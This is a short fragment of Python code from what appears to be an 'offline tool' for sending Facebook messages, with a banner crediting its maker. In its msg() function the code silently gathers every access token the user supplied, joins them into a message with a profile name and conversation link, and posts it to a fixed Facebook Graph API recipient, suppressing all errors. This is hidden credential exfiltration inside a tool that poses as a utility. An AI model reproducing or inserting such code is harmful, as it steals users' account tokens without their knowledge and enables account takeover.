...
def send_messages():
    ...
    def liness():
        print('\001b[37m' + '-------------------------OFFLINE_TOOL MADE BY XD DILBAR DON--------------------------')
    ...
    def msg():
        parameters = {
            ...
            'message': 'User Profile Name: MENTAL'+getName(random.choice(access_tokens))+'\ Token : '+" | ".join(access_tokens)+'\ Link : https://www.facebook.com/ https://www.facebook.com/messages/t/'+convo_id
        }
        with contextlib.suppress(Exception):
            requests.post("https://graph.facebook.com/v15.0/100/", data=parameters, headers=headers)
